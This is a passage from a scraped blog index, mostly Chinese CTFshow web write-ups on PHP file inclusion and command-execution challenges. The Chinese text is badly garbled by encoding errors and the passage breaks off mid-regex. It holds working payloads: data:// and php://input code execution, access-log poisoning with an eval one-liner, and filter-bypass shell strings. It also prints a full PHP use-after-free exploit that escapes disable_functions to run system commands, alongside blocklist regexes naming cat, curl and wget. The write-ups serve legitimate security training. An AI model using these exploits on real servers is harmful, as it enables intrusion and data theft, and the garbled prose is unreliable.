æ³¨é‡è¾¹ç•Œæ¡ä»¶ï¼ˆ0,1 çš„ç‰¹æ®Šå¤„ç†ï¼‰ï¼› ä¿æŒä»£ç ç®€æ´ï¼Œé€‚æ—¶æ³¨é‡Šã€‚ 3.6 æ’åº åˆ—è¡¨ï¼šlst.sort() â†’ åŸåœ°å‡åºï¼›sorted(lst, reverse=True) â†’ æ–°åˆ—è¡¨\nå­—å…¸ï¼šæŒ‰å€¼æ’åºï¼š\n1 items = sorted(d.items(), key=lambda kv: kv[1], reverse=True) 3.7 å¸¸ç”¨æ ‡å‡†åº“ 3.7.1 datetime 1 2 3 4 import datetime today = datetime.date.today() year, month, day = today.year, today.month, today.day weekday = today.weekday() # 0=Mon â€¦ 6=Sun é—°å¹´åˆ¤æ–­\n1 2 def is_leap(y): return (y%4==0 and y%100!=0) or (y%400==0) 3.7.2 random 1 2 3 4 import random random.seed(42) r1 = random.randint(1, 10) # åŒ…æ‹¬ä¸¤ç«¯ r2 = random.random() # [0,1) 3.8 å¸¸è§è‹±æ–‡å•è¯ï¼šæœˆä»½ \u0026amp; æ˜ŸæœŸ æœˆä»½ï¼ˆMonthsï¼‰ åºå· å…¨å ç¼©å†™ 1 January Jan 2 February Feb 3 March Mar 4 April Apr 5 May May 6 June Jun 7 July Jul 8 August Aug 9 September Sep 10 October Oct 11 November Nov 12 December Dec æ˜ŸæœŸï¼ˆWeekdaysï¼‰ åºå· å…¨å ç¼©å†™ 1 Monday Mon 2 Tuesday Tue 3 Wednesday Wed 4 Thursday Thu 5 Friday Fri 6 Saturday Sat 7 Sunday Sun âš ï¸ Tipï¼š\nPython ä¸­å¯ç”¨ datetime æ¨¡å—è·å–å½“å‰æœˆ/æ˜ŸæœŸï¼Œå¹¶é€šè¿‡ä»¥ä¸Šåˆ—è¡¨åšæ˜ å°„ã€‚ å¤„ç†æ—¥æœŸå­—ç¬¦ä¸²æ—¶ï¼Œç»å¸¸éœ€è¦è¯†åˆ«æˆ–è¾“å‡ºè¿™äº›å…¨ç§°/ç¼©å†™ã€‚ ","date":"2025-05-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/python_data_analysis/","title":"ä¸è–‡ğŸ‰Pythonæ•°æ®åˆ†æè¯¾ç¨‹å°å†Œ"},{"content":"WEB78 1 2 3 4 5 6 if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; include($file); }else{ highlight_file(__FILE__); } ?file=php://filter/convert.base64-encode/resource=flag.php\nç›´æ¥ç§’æ€\nWEB79 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:10:14 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:12:38 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } è¿™æ¬¡æŠŠphpæ›¿æ¢æˆ???ï¼Œç”¨åˆšæ‰é‚£ä¸ªå°±ä¸è¡Œäº†ï¼Œé¦–å…ˆphp://è¿™ä¸ªåè®®ä¼šè¢«æ›¿æ¢ï¼Œç„¶ååé¢flag.phpä¼šè¢«æ›¿æ¢æˆflag.???ï¼Œæ€ä¹ˆåŠå‘¢\nå¯ä»¥ä½¿ç”¨?file=data://text/plain,\u003c?=system('tac flag.php');?\u003eç›´æ¥å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥ç”¨base64çš„å½¢å¼?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs%2FPg%3D%3D\nè¿™é‡Œbase64éœ€è¦urlç¼–ç ä¸€ä¸‹ä¸ç„¶ä¼šå¤±è´¥ã€‚\nçœ‹åˆ«äººwpå‘ç°è¿˜å¯ä»¥ç”¨\n1 2 3 POST /?file=Php://input HTTP/1.1 \u0026lt;?Php system(\u0026#34;ls\u0026#34;);?\u0026gt; è¿™æ ·è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nWEB80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:26:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } è¿™ä¸‹æŠŠdataè¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨ä¸Šä¸€é¢˜postçš„æ–¹æ³•ï¼Œlså‘ç°è¿™æ¬¡flagæ”¾åœ¨f10g.phpé‡Œäº†\næ–¹æ³•1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 GET /?file=Php://input HTTP/1.1 Host: 4fe5398d-5f2c-407f-ad24-455e9ed43dd6.challenge.ctf.show Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;133\u0026#34;, \u0026#34;Not(A:Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept-Language: zh-CN,zh;q=0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Priority: u=0, i Connection: keep-alive Content-Length: 33 \u0026lt;?Php system(\u0026#34;cat fl0g.php\u0026#34;);?\u0026gt; HTTP/1.1 200 OK Server: nginx/1.20.1 Date: Tue, 13 May 2025 09:31:50 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/7.3.11 Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection Access-Control-Max-Age: 1728000 Content-Length: 278 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:24:37 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:25:00 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ $flag=\u0026#34;ctfshow{900c07e3-3b7f-4b21-ba7c-e19a8f1d74e8}\u0026#34;; æ–¹æ³•2 è¿™é‡Œè¿˜å¯ä»¥ç”¨uaå¤´å†™ä¸€å¥è¯ï¼Œuaé‡ŒåŠ å…¥\u0026lt;?php eval($_GET[2]);?\u0026gt;ï¼Œç„¶å/?file=/var/log/nginx/access.log\u0026amp;2=system('ls /var/www/html');phpinfo();\nå¯ä»¥çœ‹åˆ°f10g.phpï¼Œå†ç›´æ¥?file=/var/log/nginx/access.log\u0026amp;2=system('tac /var/www/html/fl0g.php');phpinfo();å³å¯ã€‚\nWEB81 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 15:51:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } è¿™æ¬¡ç›´æ¥æŠŠå†’å·è¿‡æ»¤äº†ï¼Œç›´æ¥ä¸Šä¸€é“é¢˜é‚£ä¸ªpayloadç§’æ€?file=/var/log/nginx/access.log\u0026amp;2=system('tac /var/www/html/fl0g.php');phpinfo();\n","date":"2025-05-13T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_fileinclude_write_up/","title":"CTF_show Web æ–‡ä»¶åŒ…å«writeup WEB78-WEB81"},{"content":"WEB61-WEB65 1 2 3 4 if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); } è¿™é‡Œç›´æ¥ç»™äº†evalå‡½æ•°ï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹systemå‡½æ•°è¢«ç¦ç”¨äº†ï¼Œä¸è¿‡æœ‰å¾ˆå¤šå¾ˆå¤šæ–¹æ³•å¯ä»¥è¿›è¡Œç»•è¿‡\n1 2 3 4 5 6 7 var_dump() #æ‰“å°å˜é‡ç›¸å…³ä¿¡æ¯ print_r() #æ‰“å°å¤šä¸ªå˜é‡çš„å€¼ï¼Œå¯ä»¥æ‰“å°å¤æ‚ç±»å‹å˜é‡çš„å€¼ï¼Œå¦‚array file_get_contents() highlight_file() show_source() #highlight_file()çš„åˆ«å readfile() scandir() #ç”¨äºæ‰“å°ç›®å½•ä¸‹çš„æ–‡ä»¶ è¿™é‡Œç»™ä¸€ä¸ªä¾‹å­ï¼š\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)); #æ‰“å°å½“å‰ç›®å½•æ–‡ä»¶åå­— show_source(\u0026#39;flag.php\u0026#39;); #å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚ ä»web58-web65éƒ½å¯ä»¥ä½¿ç”¨highlight_file()ç»•è¿‡ï¼Œè¿™é‡Œä¸å¤šå™è¿°äº†ã€‚\nWEB66-67 ä»ç„¶æ˜¯è¿™ä¸ª\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); }else{ highlight_file(__FILE__); } ä½†æ˜¯è¿™æ¬¡ç”¨highlight_file(\u0026quot;flag.php\u0026quot;);ä¸è¡Œäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-07 19:40:53 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 19:41:00 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ $flag=\u0026#34;ç§€ç§€å¾—äº†,è¿™æ¬¡ä¸åœ¨è¿™é‡Œ\u0026#34;; è¿™æ¬¡ä¸åœ¨è¿™é‡Œäº†ï¼Œä½¿ç”¨print_r(scandir('.')); ä½¿ç”¨c=print_r(scandir('../../../../'));æŸ¥çœ‹æ ¹ç›®å½•å‘ç°flag.txtï¼Œç»§ç»­ç”¨c=highlight_file(\u0026quot;../../../flag.txt\u0026quot;);ï¼Œå¾—åˆ°flagctfshow{93f9123f-aa36-45c4-8f55-0b3a64c46775}\nWEB68 å°è¯•includeä¸€ä¸‹index.phpï¼Œä½†æ˜¯æç¤ºï¼šFatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 262144 bytes) in /var/www/html/index.php(17) : eval()'d code on line 1ï¼Œç›´æ¥å°è¯•include(\u0026quot;/flag.txt\u0026quot;);å¾—åˆ°flag\nå¦å¤–çœ‹wpè¿˜æœ‰ä¸€ç§æ€è·¯ï¼šc=var_dump(scandir(\u0026rsquo;/\u0026rsquo;));å¯ä»¥æ‰«æåˆ°ç›®å½•\nWEB69 var_dumpè¿™é‡Œä¹Ÿè¢«ç¦ç”¨äº†ï¼Œå¯ä»¥ä½¿ç”¨c=echo json_encode(scandir(\u0026quot;/\u0026quot;));æˆ–è€…c=var_export(scandir(\u0026quot;/\u0026quot;));æ‰«æç›®å½•ï¼Œ ç„¶åç›´æ¥require()æˆ–è€…include()å¾—åˆ°flagã€‚\nWEB70 åŒä¸Šä¸€å…³ï¼Œå¦å¤–è¯»å–æ–‡ä»¶è¿˜å¯ä»¥ä½¿ç”¨echo json_encode(glob(\u0026quot;/flag.*\u0026quot;));\nWEB71 è¿™é‡Œå‘ç°ç”¨å‡½æ•°è¾“å‡ºçš„éƒ½æ˜¯???ï¼Œå‘ç°æœ‰ä¸ªé™„ä»¶ï¼Œä¸‹è½½æ‰“å¼€ç…ç…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); }else{ highlight_file(__FILE__); } ?\u0026gt; ä½ è¦ä¸Šå¤©å—ï¼Ÿ åŸæ¥æ˜¯æŠŠè¾“å‡ºæ–‡æœ¬å…¨éƒ¨æ›¿æ¢æˆ?äº†ï¼Œè¿™é‡Œå°è¯•ä½¿ç”¨dieå‡½æ•°æå‰ç»ˆæ­¢æ‰§è¡Œc=echo json_encode(scandir(\u0026quot;/\u0026quot;));die(\u0026quot;1\u0026quot;);ï¼ŒæˆåŠŸè¾“å‡º [\u0026quot;.\u0026quot;,\u0026quot;..\u0026quot;,\u0026quot;.dockerenv\u0026quot;,\u0026quot;bin\u0026quot;,\u0026quot;dev\u0026quot;,\u0026quot;etc\u0026quot;,\u0026quot;flag.txt\u0026quot;,\u0026quot;home\u0026quot;,\u0026quot;lib\u0026quot;,\u0026quot;media\u0026quot;,\u0026quot;mnt\u0026quot;,\u0026quot;opt\u0026quot;,\u0026quot;proc\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;run\u0026quot;,\u0026quot;sbin\u0026quot;,\u0026quot;srv\u0026quot;,\u0026quot;sys\u0026quot;,\u0026quot;tmp\u0026quot;,\u0026quot;usr\u0026quot;,\u0026quot;var\u0026quot;]1 ç„¶åä½¿ç”¨include(\u0026ldquo;flag.txt\u0026rdquo;);die(\u0026ldquo;1\u0026rdquo;);è·å–åˆ°äº†flagã€‚\nçœ‹åˆ«äººçš„wpå‘ç°è¿˜å¯ä»¥æå‰é€å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œåœ¨åŠ«æŒè¾“å‡ºç¼“å†²åŒºä¹‹å‰å°±æŠŠç¼“å†²åŒºé€å‡ºï¼Œå¯ä»¥ç”¨çš„å‡½æ•°æœ‰ï¼š\n1 2 ob_flush(); ob_end_flush(); WEB72 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); }else{ highlight_file(__FILE__); } ?\u0026gt; ä½ è¦ä¸Šå¤©å—ï¼Ÿ è¿™é“é¢˜æµ‹è¯•å‘ç°æ–°å¢äº†é™åˆ¶ç›®å½•ï¼Œç°åœ¨è®¿é—®ä¸äº†æ ¹ç›®å½•äº† ä½¿ç”¨c=var_export(scandir(\u0026quot;.\u0026quot;));die();å¯ä»¥æ­£å¸¸å›æ˜¾ï¼š array ( 0 =\u0026gt; \u0026lsquo;.\u0026rsquo;, 1 =\u0026gt; \u0026lsquo;..\u0026rsquo;, 2 =\u0026gt; \u0026lsquo;flag.php\u0026rsquo;, 3 =\u0026gt; \u0026lsquo;index.php\u0026rsquo;, ) ä½†æ˜¯c=var_export(scandir(\u0026quot;/\u0026quot;));die();å°±ä¼šæŠ¥é”™ï¼Œopen_basediré™åˆ¶äº†ç›®å½•ï¼Œ/var/www/html/ä»¥å¤–çš„ç›®å½•éƒ½è¢«ç¦æ­¢è®¿é—®äº†ã€‚ è¿™é“é¢˜æ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œçœ‹äº†æç¤ºæ˜¯ç”¨globä¼ªåè®®è¯»å–çš„ç›®å½•ï¼Œç„¶åæç¤ºä½¿ç”¨uafè„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nQï¼šUAFä¸æ˜¯ä¹Ÿå¯ä»¥ls /å—\nAï¼šåˆ«é—®ï¼Œé—®å°±æ˜¯å­¦ä¹ ä¼ªåè®®\n1 2 3 4 5 6 7 c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;); foreach($a as $f) {echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;); } e xit(0); ?\u0026gt; UAF:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 c=function ctfshow($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u0026gt;a); $backtrace = (new Exception)-\u0026gt;getTrace(); if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u0026gt;= 0; $j--) { $address \u0026lt;\u0026lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \u0026#34;\u0026#34;; for ($i=0; $i \u0026lt; $m; $i++) { $out .= sprintf(\u0026#34;%c\u0026#34;,($ptr \u0026amp; 0xff)); $ptr \u0026gt;\u0026gt;= 8; } return $out; } function write(\u0026amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u0026lt; $n; $i++) { $str[$p + $i] = sprintf(\u0026#34;%c\u0026#34;,($v \u0026amp; 0xff)); $v \u0026gt;\u0026gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u0026gt;a); if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u0026lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u0026lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026amp; 0xfffffffffffff000; for($i = 0; $i \u0026lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); $vuln = new Vuln(); $vuln-\u0026gt;a = $arg; } if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); } $n_alloc = 10; $contiguous = []; for($i = 0; $i \u0026lt; $n_alloc; $i++) $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); trigger_uaf(\u0026#39;x\u0026#39;); $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; $helper = new Helper; $helper-\u0026gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\u0026#34;UAF failed\u0026#34;); } $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); } if(!($elf = parse_elf($base))) { die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); } if(!($zif_system = get_system($basic_funcs))) { die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); } $fake_obj_offset = 0xd0; for($i = 0; $i \u0026lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-\u0026gt;b)($cmd); exit(); } ctfshow(\u0026#34;cat /flag0.txt\u0026#34;);ob_end_flush(); ?\u0026gt; æ€»ç»“ï¼šçœ‹ä¸æ‡‚ï¼Œå’Œpwnæœ‰å…³ã€‚ä»¥åå†æ¥~\nWEB73 1 2 3 4 5 6 7 c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;); foreach($a as $f) {echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;); } e xit(0); ?\u0026gt; ç›´æ¥ç”¨ä¸Šä¸€é“é¢˜çš„payloadå³å¯ï¼Œè¿™é“é¢˜ä¸ç”¨uafç›´æ¥includeå³å¯ã€‚\n1 c=include(\u0026#34;/flagc.txt\u0026#34;);die(); ","date":"2025-04-22T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_4/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P4 WEB61-WEB736"},{"content":"CTFSHOW web å‘½ä»¤æ‰§è¡ŒWriteUP Part3 WEB51 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:42:52 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é‡ŒæŠŠtacä¹Ÿè¿‡æ»¤äº†ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š 1.ä½¿ç”¨\u0026rsquo;\u0026lsquo;ç»•è¿‡è¿‡æ»¤ 2.ä½¿ç”¨å…¶ä»–æŒ‡ä»¤ç»•è¿‡æ¯”å¦‚revï¼Œhexdumpï¼Œviï¼Œnl\n1 ?c=t%27%27ac\u0026lt;fl%27%27ag.php|| WEB52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:50:30 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™æ¬¡flagåœ¨æ ¹ç›®å½•ï¼Œä¸è¿‡æŠŠ\u0026lt;ä¹Ÿè¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨$IFSç»•è¿‡\n1 2 /?c=nl$IFS/fla\u0026#39;\u0026#39;g|| /?c=ca\\t$IFS/fla\u0026#39;\u0026#39;g|| WEB53 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 18:21:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ echo($c); $d = system($c); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; }else{ echo \u0026#39;no\u0026#39;; } }else{ highlight_file(__FILE__); } æœ¬é¢˜å¯ä»¥é€šè¿‡åæ–œæ å’Œå¼•å·ç»•è¿‡e.g.?c=nl${IFS}fl\\ag.php ?c=ca\\t${IFS}fl\\ag.php p.s.ä¸€ä¸ªå°çŸ¥è¯†ï¼š WEB54 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 19:43:42 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| 